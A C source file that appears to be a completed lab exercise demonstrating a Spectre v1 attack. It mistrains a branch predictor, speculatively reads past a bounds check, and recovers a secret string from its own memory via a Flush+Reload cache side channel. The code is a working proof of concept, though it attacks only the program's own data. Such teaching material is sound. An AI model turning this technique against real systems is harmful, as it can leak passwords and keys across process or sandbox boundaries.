#include <stdio.h>
#include <string.h>
#include "cacheutils.h"

static char* string = "helloTOPSECRET";

static char __attribute__((aligned(4096))) lut[256*4096];
static char __attribute__((aligned(4096))) tmp[256*4096];

/* Get character from string if it is in-bounds */
char access_array(char* mem, int idx) {
  if ((idx / 1.123) < (5 / 1.123)) {  // artificially slow down condition
    maccess(mem + string[idx] * 4096); // a Spectre gadget
    return string[idx];
  }
  return 0;
}

int main(int argc, char *argv[])
{
  /* Calculate Flush+Reload threshold */
  size_t cache_miss = calibrate_flush_reload();
  fprintf(stderr, "[+] Flush+Reload Threshold: %zd\n", cache_miss);

  /* Initialize and flush LUT */
  memset(lut, 1, 4096 * 256);
  for (size_t i = 0; i < 256; i++) {
    flush(lut + 4096 * i);
  }

  memset(tmp, 0, 4096 * 256);

  /* Spectre V1 */
  char recovered[10];
  memset(recovered, ' ', sizeof(recovered));
  recovered[9] = '\0';

  /* Verify that we can't access the secret architecturally */
  fprintf(stderr, "[*] Architectural access: ");
  for(size_t character = 0; character < 15; character++) {
    fprintf(stderr, "%c", access_array(tmp, character));
  }
  fprintf(stderr, "\n");
  
  /* Mount attack */
  while (1) {
    for (size_t character = 5; character < 15; character++) {
      size_t recovered_index = character - 5;

      /* TODO: Spectre v1
       * The function access_array has a bounds check to
       * validate that the user of this function can only access the lower parts
       * of the secret string. Can we trick the CPU into accessing the upper
       * part as well?
       *
       * 1. Mistrain the branch predictor by calling the `access_array` function
       *    with a valid index multiple times
       * 2. Call the `access_array` function with an out-of-bounds index
       * 3. Recover the leaked data using Flush+Reload from the `lut` array.
       * 4. Store the recovered character in `recovered[recovered_index]`.
       */

      /* Mistraining */
      // TODO
      for (size_t i = 0; i < 10; i++) {
        access_array(tmp, 0);
      }
      
      /* Speculative access */
      // TODO
      access_array(lut, character);

      /* Check for cache hits */
      // TODO
      for (int i = 0; i < 256; i++) {
        int offset = (i * 101 + 17) % 256; // ensure pseudo-random order for tests
        if(offset < 'A' || offset > 'Z') continue;

        if (flush_reload(lut + 4096 * offset) < cache_miss) {
            recovered[recovered_index] = offset;
        }
      }
    }

    fprintf(stderr, "\r%s", recovered);

    if (strcmp(recovered, string + 5) == 0) {
      fprintf(stderr, "\nSuccessful.\n");
      break;
    }
  }

  return 0;
}

